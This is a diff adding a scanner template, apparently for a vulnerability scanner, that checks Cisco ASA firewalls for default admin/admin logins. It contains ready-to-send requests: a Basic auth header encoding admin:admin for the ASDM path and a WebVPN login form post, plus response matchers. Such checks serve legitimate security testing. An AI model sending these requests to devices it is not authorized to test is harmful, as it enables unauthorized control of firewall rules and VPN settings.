@@ -1,0 +1,21 @@
+name: Cisco ASA Default Credentials
+description: Attempts to authenticate to Cisco Adaptive Security Appliance (ASA) ASDM or web interface using default admin/admin credentials. Access enables modification of firewall rules and VPN configurations.
+severity: critical
+cwe: CWE-1392
+
+requests:
+  - method: GET
+    path: /admin/exec/show+version
+    headers:
+      Authorization: "Basic YWRtaW46YWRtaW4="
+  - method: POST
+    path: /+webvpn+/index.html
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "username=admin&password=admin&Login=Login"
+
+matchers:
+  - body_contains: "Cisco Adaptive Security"
+  - body_contains: "ASDM"
+  - body_contains: "Firewall"
+  - status_code: 200
